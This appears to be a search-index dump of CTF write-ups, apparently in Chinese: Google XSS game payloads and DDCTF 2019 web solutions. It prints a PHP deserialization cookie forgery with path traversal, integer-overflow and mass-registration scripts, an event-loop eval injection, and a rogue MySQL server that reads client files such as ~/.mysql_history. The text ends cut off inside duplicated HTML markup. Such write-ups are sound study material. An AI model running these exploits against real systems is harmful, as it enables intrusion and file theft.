src=\u0026#34;/static/game-frame.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/game-frame-styles.css\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body id=\u0026#34;level5\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/logos/level5.png\u0026#34; /\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;!-- We\u0026#39;re ignoring the email, but the poor user will never know! --\u0026gt; Enter email: \u0026lt;input id=\u0026#34;reader-email\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;\u0026#34;\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;a href=\u0026#34;{{ next }}\u0026#34;\u0026gt;Next \u0026gt;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; solution:\nhttps://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(\u0026#39;xss\u0026#39;) and click the Next button.\nlevel 6 This website allow user to execute alternative js script\nsolution:\nhttps://xss-game.appspot.com/level6/frame#data:text/plain,alert(\u0026#39;xss\u0026#39;) ","permalink":"https://ch3n9w.github.io/posts/ctf-google-game/","summary":"\u003ch1 id=\"google-xss-game\"\u003eGoogle Xss game\u003c/h1\u003e","title":"Google_Game"},{"content":"考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。\nweb 签到题 点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送Auth.php请求，其中有didictf_username字段，尝试添加成为didictf_username: admin。成功登陆。\n然后在返回包中显示出了一个php文件，尝试访问看到了Session.php的源代码如下：\n\u0026lt;?php Class Application { var $path = \u0026#39;\u0026#39;; public function response($data, $errMsg = \u0026#39;success\u0026#39;) { $ret = [\u0026#39;errMsg\u0026#39; =\u0026gt; $errMsg, \u0026#39;data\u0026#39; =\u0026gt; $data]; $ret = json_encode($ret); header(\u0026#39;Content-type: application/json\u0026#39;); echo $ret; } public function auth() { $DIDICTF_ADMIN = \u0026#39;admin\u0026#39;; if(!empty($_SERVER[\u0026#39;HTTP_DIDICTF_USERNAME\u0026#39;]) \u0026amp;\u0026amp; $_SERVER[\u0026#39;HTTP_DIDICTF_USERNAME\u0026#39;] == $DIDICTF_ADMIN) { $this-\u0026gt;response(\u0026#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php\u0026#39;); return TRUE; }else{ $this-\u0026gt;response(\u0026#39;抱歉，您没有登陆权限，请获取权限后访问-----\u0026#39;,\u0026#39;error\u0026#39;); exit(); } } private function sanitizepath($path) { $path = trim($path);//去掉空格 $path=str_replace(\u0026#39;../\u0026#39;,\u0026#39;\u0026#39;,$path);//过滤第一 $path=str_replace(\u0026#39;..\\\\\u0026#39;,\u0026#39;\u0026#39;,$path);//过滤第二 return $path; }// public function __destruct() { if(empty($this-\u0026gt;path)) { exit(); }else{ $path = $this-\u0026gt;sanitizepath($this-\u0026gt;path);// ....//config/flag.php if(strlen($path) !== 18) {//../config/flag.php exit(); } $this-\u0026gt;response($data=file_get_contents($path),\u0026#39;Congratulations\u0026#39;); } exit(); } } ?\u0026gt; \u0026lt;?php include \u0026#39;Application.php\u0026#39;; class Session extends Application { //key建议为8位字符串 var $eancrykey = \u0026#39;\u0026#39;; var $cookie_expiration\t= 7200; var $cookie_name = \u0026#39;ddctf_id\u0026#39;; var $cookie_path\t= \u0026#39;\u0026#39;; var $cookie_domain\t= \u0026#39;\u0026#39;; var $cookie_secure\t= FALSE; var $activity = \u0026#34;DiDiCTF\u0026#34;; public function index() { if(parent::auth()) { $this-\u0026gt;get_key(); if($this-\u0026gt;session_read()) { $data = \u0026#39;DiDI Welcome you %s\u0026#39;; $data = sprintf($data,$_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]); parent::response($data,\u0026#39;sucess\u0026#39;); }else{ $this-\u0026gt;session_create(); $data = \u0026#39;DiDI Welcome you\u0026#39;; parent::response($data,\u0026#39;sucess\u0026#39;); } } } private function get_key() { //eancrykey and flag under the folder $this-\u0026gt;eancrykey = file_get_contents(\u0026#39;../config/key.txt\u0026#39;); } public function session_read() {//target1: 绕过所有false if(empty($_COOKIE)) { return FALSE; }//cookie not empty $session = $_COOKIE[$this-\u0026gt;cookie_name]; if(!isset($session)) { parent::response(\u0026#34;session not found\u0026#34;,\u0026#39;error\u0026#39;); return FALSE; }//ddctf_id 不能为空 $hash = substr($session,strlen($session)-32);//长度要大于32? 32位之后的内容 $session = substr($session,0,strlen($session)-32);//一直截断到倒数第32位 if($hash !== md5($this-\u0026gt;eancrykey.$session)) {//key.txt 内容和 ddctf_id 内容片段拼接 再md5 等于ddctf_id32位之后的内容 parent::response(\u0026#34;the cookie data not match\u0026#34;,\u0026#39;error\u0026#39;); return FALSE; } $session = unserialize($session);//ddctf_id 反序列化 if(!is_array($session) OR !isset($session[\u0026#39;session_id\u0026#39;]) OR !isset($session[\u0026#39;ip_address\u0026#39;]) OR !isset($session[\u0026#39;user_agent\u0026#39;])){ return FALSE; }//ddctf_id 反序列化之后的内容要有 session_id ip_address user_agent 再来个path?? if(!empty($_POST[\u0026#34;nickname\u0026#34;])) { $arr = array($_POST[\u0026#34;nickname\u0026#34;],$this-\u0026gt;eancrykey); $data = \u0026#34;Welcome my friend %s\u0026#34;; foreach ($arr as $k =\u0026gt; $v) { $data = sprintf($data,$v); } parent::response($data,\u0026#34;Welcome\u0026#34;); }//sprint格式化打印函数利用，通过传递进参数nickname = %S 让它可以读取key。 if($session[\u0026#39;ip_address\u0026#39;] != $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]) { parent::response(\u0026#39;the ip addree not match\u0026#39;.\u0026#39;error\u0026#39;); return FALSE; }//ip_address 要写自己的ip if($session[\u0026#39;user_agent\u0026#39;] != $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]) { parent::response(\u0026#39;the user agent not match\u0026#39;,\u0026#39;error\u0026#39;); return FALSE; }//user_agent 内容要和 http_user_agent的匹配 return TRUE; }//看起来可以动手脚的只有session_id? private function session_create() { $sessionid = \u0026#39;\u0026#39;; while(strlen($sessionid) \u0026lt; 32) { $sessionid .= mt_rand(0,mt_getrandmax()); } $userdata = array( \u0026#39;session_id\u0026#39; =\u0026gt; md5(uniqid($sessionid,TRUE)), \u0026#39;ip_address\u0026#39; =\u0026gt; $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;], \u0026#39;user_agent\u0026#39; =\u0026gt; $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;], \u0026#39;user_data\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); $cookiedata = serialize($ ); $cookiedata = $cookiedata.md5($this-\u0026gt;eancrykey.$cookiedata); $expire = $this-\u0026gt;cookie_expiration + time(); setcookie( $this-\u0026gt;cookie_name, $cookiedata, $expire, $this-\u0026gt;cookie_path, $this-\u0026gt;cookie_domain, $this-\u0026gt;cookie_secure ); } } $ddctf = new Session(); $ddctf-\u0026gt;index(); ?\u0026gt; 得到key之后构造ddctfid:\n\u0026lt;?php //nickname = %s $a = \u0026#39;a:4:{s:10:\u0026#34;session_id\u0026#34;;s:32:\u0026#34;3f65fc339c032f85048e42f21fab4ef0\u0026#34;;s:10:\u0026#34;ip_address\u0026#34;;s:14:\u0026#34;211.137.22.191\u0026#34;;s:10:\u0026#34;user_agent\u0026#34;;s:78:\u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0\u0026#34;;s:9:\u0026#34;user_data\u0026#34;;s:0:\u0026#34;\u0026#34;;}\u0026#39;; $b = unserialize($a); class Application{ public $path = \u0026#39;....//config/flag.txt\u0026#39;; } $key = \u0026#39;EzblrbNS\u0026#39;; $b[\u0026#39;user_data\u0026#39;] = new Application; $d = serialize($b); echo urlencode($d.md5($key.$d)); 传参即可。\n大吉大利今晚吃鸡 遇到买东西的题目首先思路就是改变价格，通过抓包发现价格可以往大改而不能往小改。可以利用整数溢出0xffffffff+1，传参进去就买到了。 然后要淘汰100个人，实际上要淘汰149个人。脚本如下：\nimport requests import string import random import json import re url = \u0026#39;http://117.51.147.155:5050\u0026#39; seq = [ \u0026#39;register\u0026#39;, \u0026#39;login\u0026#39;, \u0026#39;balance\u0026#39;, \u0026#39;search_ticket\u0026#39;, \u0026#39;bill\u0026#39;, \u0026#39;buy\u0026#39;, \u0026#39;bill\u0026#39;, \u0026#39;pay\u0026#39;] url_seg = { \u0026#39;register\u0026#39;:\u0026#39;/ctf/api/register?name={0}\u0026amp;password=11111111\u0026#39;, \u0026#39;login\u0026#39;:\u0026#39;/ctf/api/login?name={0}\u0026amp;password=11111111\u0026#39;, \u0026#39;balance\u0026#39;:\u0026#39;/ctf/api/get_user_balance\u0026#39;, \u0026#39;search_ticket\u0026#39;:\u0026#39;/ctf/api/search_ticket\u0026#39;, \u0026#39;bill\u0026#39;:\u0026#39;/ctf/api/search_bill_info\u0026#39;, \u0026#39;buy\u0026#39;:\u0026#39;/ctf/api/buy_ticket?ticket_price=4294967296\u0026#39;, \u0026#39;remove\u0026#39;:\u0026#39;/ctf/api/remove_robot?id={0}\u0026amp;ticket={1}\u0026#39;, \u0026#39;pay\u0026#39;:\u0026#39;/ctf/api/pay_ticket?bill_id={0}\u0026#39;} session = requests.session() victiom ={ 1: \u0026#39;21cb23b38e33426812d68991dbb6ba68\u0026#39;, 2: \u0026#39;6f89be1e66c9bd69bce99952aa009a96\u0026#39;, 3: \u0026#39;70e1b0196609646efd0aacea613943d6\u0026#39;, 4: \u0026#39;46f7f7e50b54a636f3aae60dd839590b\u0026#39;, 5: \u0026#39;395b9fb4fb0f3cf42a727d43536be457\u0026#39;, ··· ··· 147: \u0026#39;4cc522f84f11189d9737ab18fc22fcd0\u0026#39;, 148: \u0026#39;8f2675372aa0f2ecfee1aeeee3d814cd\u0026#39;, 149: \u0026#39;7544b9ee45ae6ae7066305d472077638\u0026#39;} def register_login_get_ticket(): global victiom global session while True: username = random.sample(string.letters, 19) username1 = \u0026#39;\u0026#39;.join(username) register1 = url_seg[\u0026#39;register\u0026#39;].format(str(username1)) reg_url = url + register1 print reg_url res = session.get(reg_url).content if \u0026#39;\\u7528\\u6237\\u6ce8\\u518c\\u6210\\u529f\u0026#39; in res: log_url = url + url_seg[\u0026#39;login\u0026#39;].format(username1) session.get(log_url) buy_url = url + url_seg[\u0026#39;buy\u0026#39;] res = session.get(buy_url).content bill_url = url + url_seg[\u0026#39;bill\u0026#39;] html = session.get(bill_url) jsonn = json.loads(html.text) bill_id = jsonn[\u0026#39;data\u0026#39;][0][\u0026#39;bill_id\u0026#39;] pay_url = url + url_seg[\u0026#39;pay\u0026#39;].format(bill_id) session.get(pay_url) sear_url = url + url_seg[\u0026#39;search_ticket\u0026#39;] html = session.get(sear_url) res = html.content josnn = json.loads(html.text) id = josnn[\u0026#39;data\u0026#39;][0][\u0026#39;id\u0026#39;] # 这个地方有点奇怪，josn解析不出ticket所以采用正则匹配的方式 ticket = re.search(\u0026#34;ticket\\\u0026#34;:\\\u0026#34;(.*?)\\\u0026#34;\u0026#34;, res).group(1) victiom[id] = ticket print victiom if len(victiom) == 149: break def delete_other(): session = requests.session() regiter1 = url_seg[\u0026#39;register\u0026#39;].format(\u0026#39;ch5ser_cqw_cq\u0026#39;) reg_url = url + regiter1 res = session.get(reg_url).content if \u0026#39;\\u7528\\u6237\\u6ce8\\u518c\\u6210\\u529f\u0026#39; in res: log_url = url + url_seg[\u0026#39;login\u0026#39;].format(\u0026#39;ch5ser_cqw_cq\u0026#39;) session.get(log_url) buy_url = url + url_seg[\u0026#39;buy\u0026#39;] res = session.get(buy_url).content bill_url = url + url_seg[\u0026#39;bill\u0026#39;] html = session.get(bill_url) jsonn = json.loads(html.text) bill_id = jsonn[\u0026#39;data\u0026#39;][0][\u0026#39;bill_id\u0026#39;] pay_url = url + url_seg[\u0026#39;pay\u0026#39;].format(bill_id) session.get(pay_url) sear_url = url + url_seg[\u0026#39;search_ticket\u0026#39;] html = session.get(sear_url) for key, value in victiom.items(): remove = url_seg[\u0026#39;remove\u0026#39;].format(str(key), value) rem_url = url + remove print session.get(rem_url).content print session.get(\u0026#34;http://117.51.147.155:5050/ctf/api/get_flag\u0026#34;).content def main(): # 注册过快可能会被封 register_login_get_ticket() delete_other() if __name__ == \u0026#39;__main__\u0026#39;: main() 学长的脚本\nimport requests import json def reg(): for i in range(0,1000): url = \u0026#34;http://117.51.147.155:5050/ctf/api/register?name=cic\u0026#34;+str(i)+\u0026#34;\u0026amp;password=12345678\u0026#34; html = requests.get(url) print(html.text) def get_ticket(i): s = requests.session() s.get(\u0026#34;http://117.51.147.155:5050/ctf/api/login?name=cic\u0026#34;+str(i)+\u0026#34;\u0026amp;password=12345678\u0026#34;) html = s.get(\u0026#34;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296\u0026#34;) json1 = json.loads(html.text) ticketid = json1[\u0026#34;data\u0026#34;][0][\u0026#34;bill_id\u0026#34;] html1 = s.get(\u0026#34;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=\u0026#34;+ticketid) html2 = s.get(\u0026#34;http://117.51.147.155:5050/ctf/api/search_ticket\u0026#34;) json2 = json.loads(html2.text) id = json2[\u0026#34;data\u0026#34;][0][\u0026#34;id\u0026#34;] ticket = json2[\u0026#34;data\u0026#34;][0][\u0026#34;ticket\u0026#34;] pack = {\u0026#34;id\u0026#34;:id , \u0026#34;ticket\u0026#34;:ticket} return pack def del_people(id,ticket): s = requests.session() s.get(\u0026#34;http://117.51.147.155:5050/ctf/api/login?name=cic\u0026amp;password=12345678\u0026#34;) html = s.get(\u0026#34;http://117.51.147.155:5050/ctf/api/remove_robot?id=\u0026#34;+str(id)+\u0026#34;\u0026amp;ticket=\u0026#34;+ticket) print(html.text) if __name__ == \u0026#39;__main__\u0026#39;: reg() #get_ticket() for i in range(0,1000): pack = get_ticket(i) id = pack[\u0026#34;id\u0026#34;] ticket = pack[\u0026#34;ticket\u0026#34;] print(id) print(ticket) del_people(id, ticket) #del_people(id,ticket) 滴 沙雕题目，要读取的文件.practice.txt.swp在线索网址的作者的另一篇博客中出现过，读取，获得源码，传递引用就可以了\n图片上传 上传一张图片，提示缺少字段phpinfo(),并显示出了上传后的图片，下载后放入010editor中比较发现文件被改动，比较发现特定位置上的字节并没有被改动，在该位置后面添加phpinfo()上传就有flag了。\nhomebrew event loop read the source code first\n# -*- encoding: utf-8 -*- # written in python 3.7 __author__ = \u0026#39;garzon\u0026#39; from flask import Flask, session, request, Response import urllib app = Flask(__name__) app.secret_key = \u0026#39;*********************\u0026#39; # censored url_prefix = \u0026#39;/d5af31f66741e857\u0026#39; def FLAG(): return \u0026#39;FLAG_is_here_but_i_wont_show_you\u0026#39; # censored # put event in a queue def trigger_event(event): session[\u0026#39;log\u0026#39;].append(event) if len(session[\u0026#39;log\u0026#39;]) \u0026gt; 5: session[\u0026#39;log\u0026#39;] = session[\u0026#39;log\u0026#39;][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) # get the string between prefix and postfix def get_mid_str(haystack, prefix, postfix=None): haystack = haystack[haystack.find(prefix)+len(prefix):] if postfix is not None: haystack = haystack[:haystack.find(postfix)] return haystack class RollBackException: pass def execute_event_loop(): valid_event_chars = set(\u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#\u0026#39;) resp = None # handle a event everytime while len(request.event_queue) \u0026gt; 0: event = request.event_queue[0] # `event` is something like \u0026#34;action:ACTION;ARGS0#ARGS1#ARGS2......\u0026#34; request.event_queue = request.event_queue[1:] if not event.startswith((\u0026#39;action:\u0026#39;, \u0026#39;func:\u0026#39;)): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == \u0026#39;a\u0026#39; action = get_mid_str(event, \u0026#39;:\u0026#39;, \u0026#39;;\u0026#39;) args = get_mid_str(event, action+\u0026#39;;\u0026#39;).split(\u0026#39;#\u0026#39;) try: # trigger_event%23;get_flag # 这个地方有意思，%23也就是井号是在拼接之后在eval的时候才触发的，而不是在拼接的时候立刻触发。而从下面来看，似乎井号的触发范围也封装在了event_handle里面了，而不会影响范围外的执行。 event_handler = eval(action + (\u0026#39;_handler\u0026#39; if is_action else \u0026#39;_function\u0026#39;)) ret_val = event_handler(args) except RollBackException: if resp is None: resp = \u0026#39;\u0026#39; resp += \u0026#39;ERROR! All transactions have been cancelled. \u0026lt;br /\u0026gt;\u0026#39; resp += \u0026#39;\u0026lt;a href=\u0026#34;./?action:view;index\u0026#34;\u0026gt;Go back to index.html\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; session[\u0026#39;num_items\u0026#39;] = request.prev_session[\u0026#39;num_items\u0026#39;] session[\u0026#39;points\u0026#39;] = request.prev_session[\u0026#39;points\u0026#39;] break except Exception, e: if resp is None: resp = \u0026#39;\u0026#39; #resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == \u0026#39;\u0026#39;: resp = (\u0026#39;404 NOT FOUND\u0026#39;, 404) session.modified = True return resp @app.route(url_prefix+\u0026#39;/\u0026#39;) def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == \u0026#39;\u0026#39; or (not querystring.startswith(\u0026#39;action:\u0026#39;)) or len(querystring) \u0026gt; 100: querystring = \u0026#39;action:index;False#False\u0026#39; if \u0026#39;num_items\u0026#39; not in session: session[\u0026#39;num_items\u0026#39;] = 0 session[\u0026#39;points\u0026#39;] = 3 session[\u0026#39;log\u0026#39;] = [] request.prev_session = dict(session) trigger_event(querystring) return execute_event_loop() # handlers/functions below -------------------------------------- def view_handler(args): page = args[0] html = \u0026#39;\u0026#39; html += \u0026#39;[INFO] you have {} diamonds, {} points now.\u0026lt;br /\u0026gt;\u0026#39;.format(session[\u0026#39;num_items\u0026#39;], session[\u0026#39;points\u0026#39;]) if page == \u0026#39;index\u0026#39;: html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:index;True%23False\u0026#34;\u0026gt;View source code\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:view;shop\u0026#34;\u0026gt;Go to e-shop\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:view;reset\u0026#34;\u0026gt;Reset\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; elif page == \u0026#39;shop\u0026#39;: html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:buy;1\u0026#34;\u0026gt;Buy a diamond (1 point)\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; elif page == \u0026#39;reset\u0026#39;: del session[\u0026#39;num_items\u0026#39;] html += \u0026#39;Session reset.\u0026lt;br /\u0026gt;\u0026#39; html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:view;index\u0026#34;\u0026gt;Go back to index.html\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; return html def index_handler(args): bool_show_source = str(args[0]) bool_download_source = str(args[1]) if bool_show_source == \u0026#39;True\u0026#39;: source = open(\u0026#39;eventLoop.py\u0026#39;, \u0026#39;r\u0026#39;) html = \u0026#39;\u0026#39; if bool_download_source != \u0026#39;True\u0026#39;: html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:index;True%23True\u0026#34;\u0026gt;Download this .py file\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:view;index\u0026#34;\u0026gt;Go back to index.html\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; for line in source: if bool_download_source != \u0026#39;True\u0026#39;: html += line.replace(\u0026#39;\u0026amp;\u0026#39;,\u0026#39;\u0026amp;amp;\u0026#39;).replace(\u0026#39;\\t\u0026#39;, \u0026#39;\u0026amp;nbsp;\u0026#39;*4).replace(\u0026#39; \u0026#39;,\u0026#39;\u0026amp;nbsp;\u0026#39;).replace(\u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026amp;lt;\u0026#39;).replace(\u0026#39;\u0026gt;\u0026#39;,\u0026#39;\u0026amp;gt;\u0026#39;).replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026lt;br /\u0026gt;\u0026#39;) else: html += line source.close() if bool_download_source == \u0026#39;True\u0026#39;: headers = {} headers[\u0026#39;Content-Type\u0026#39;] = \u0026#39;text/plain\u0026#39; headers[\u0026#39;Content-Disposition\u0026#39;] = \u0026#39;attachment; filename=serve.py\u0026#39; return Response(html, headers=headers) else: return html else: trigger_event(\u0026#39;action:view;index\u0026#39;) def buy_handler(args): num_items = int(args[0]) if num_items \u0026lt;= 0: return \u0026#39;invalid number({}) of diamonds to buy\u0026lt;br /\u0026gt;\u0026#39;.format(args[0]) session[\u0026#39;num_items\u0026#39;] += num_items trigger_event([\u0026#39;func:consume_point;{}\u0026#39;.format(num_items), \u0026#39;action:view;index\u0026#39;]) def consume_point_function(args): point_to_consume = int(args[0]) if session[\u0026#39;points\u0026#39;] \u0026lt; point_to_consume: raise RollBackException() session[\u0026#39;points\u0026#39;] -= point_to_consume def show_flag_function(args): flag = args[0] #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return \u0026#39;You naughty boy! ;) \u0026lt;br /\u0026gt;\u0026#39; def get_flag_handler(args): if session[\u0026#39;num_items\u0026#39;] \u0026gt;= 5: trigger_event(\u0026#39;func:show_flag;\u0026#39; + FLAG()) # show_flag_function has been disabled, no worries trigger_event(\u0026#39;action:view;index\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=False, host=\u0026#39;0.0.0.0\u0026#39;) 这里有个点有疑问：\n为什么get_flag_handle函数可以在没有参数的情况下运行？毕竟他申明的时候是有参数的。\n值得注意的是，get_flag_handle 和 buy函数是在consume_point_function执行之前被执行的，这个函数会检查我们是否有足够的钻石，如果没有就回滚。然而，整个流程是通过队列来控制的，这意味着如果我们将buy和get_flag函数插入在consume_point_function前面的话，他们会先执行并获取到flag， 注意到trigger_event会将flag放进log之中去并放在session中显示回来。\nmysql弱口令 客户端访问服务端时，服务端可以向客户端发送请求并且实现任意文件读取。\n题目中的脚本目的是检测是否开启了mysql服务，所以可以将回显的东西设置为 result = [{'local_address':\u0026quot;0.0.0.0:3306\u0026quot;,'Process_name':\u0026quot;1234/mysqld\u0026quot;}]，这样就可以绕过客户端的验证了。\n然后伪造一个mysql客户端。包括三部分：伪造greeting包，伪造登录成功包，伪造文件响应包。 脚本如下：\nimport socket host = \u0026#39;0.0.0.0\u0026#39; port = 3306 server = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server.bind((host,port)) server.listen(5) # filename = \u0026#39;/etc/passwd\u0026#39; filename = \u0026#39;~/.mysql_history\u0026#39; greeting = \u0026#34;5b0000000a352e372e32362d307562756e7475302e31392e30342e31000c0000001c2a785a183c1a6200fff7080200ff811500000000000000000000336b72452b23601d7c206856006d7973716c5f6e61746976655f70617373776f726400\u0026#34;.decode(\u0026#39;hex\u0026#39;) login_conf = \u0026#34;0700000200000002000000\u0026#34;.decode(\u0026#39;hex\u0026#39;) # 这里的chr值得注意 evil_request = chr(len(filename) + 1)+\u0026#34;\\x00\\x00\\x01\\xfb\u0026#34;+filename conn, addr = server.accept() conn.send(greeting) print conn.recv(9999) conn.send(login_conf) print conn.recv(9999) conn.send(evil_request) print conn.recv(9999) 三个发送的东西分别对应如下：\ngreeting\n登录通过包\n文件回显包\n同时运行经过修改后的agent.py和我们的脚本，同时在题目中填上我们的ip和mysql的端口号，就得到了flag\n参考 ： https://xz.aliyun.com/t/3277\nhttp://russiansecurity.expert/2016/04/20/mysql-connect-file-read/\nhttps://www.anquanke.com/post/id/106488\nwireshark 拿到数据包，打开，设置过滤条件http，可以看到这里有图片流量。使用file-\u0026gt;export objects-\u0026gt;http来导出所有可以导出的东西，然后有两个通过16进制编辑器修改得出的图片和一张完整图片。其中，两张图片中有一张无法查看，另一张和完整的那张图片一模一样。或者也可以右击导出图中指定的图片部分数据。\n{:height 684, :width 766}\n在wireshark中追踪TCP流，发现最开始访问了一个图片加密的网站。\n进入，看起来图片的解密是需要密钥的，那么另一张无法查看的图片可能有我们想要的密钥。修改高宽之后可以查看密钥。进入解密网站解密，并用16进制解密即可。\n","permalink":"https://ch3n9w.github.io/posts/ctf-2019-ddctf-web/","summary":"\u003cp\u003e考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。\u003c/p\u003e\n\u003ch2 id=\"web-签到题\"\u003eweb 签到题\u003c/h2\u003e\n\u003cp\u003e点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送\u003ccode\u003eAuth.php\u003c/code\u003e请求，其中有\u003ccode\u003edidictf_username\u003c/code\u003e字段，尝试添加成为\u003ccode\u003edidictf_username: admin\u003c/code\u003e。成功登陆。\u003c/p\u003e\n\u003cp\u003e然后在返回包中显示出了一个\u003ccode\u003ephp文件\u003c/code\u003e，尝试访问看到了\u003ccode\u003eSession.php\u003c/code\u003e的源代码如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eClass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eApplication\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e $path \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e($data, $errMsg \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;success\u0026#39;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      $ret \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;errMsg\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e $errMsg,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;data\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e $data];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      $ret \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson_encode\u003c/span\u003e($ret);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003eheader\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Content-type: application/json\u0026#39;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003eecho\u003c/span\u003e $ret;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eauth\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      $DIDICTF_ADMIN \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;admin\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan 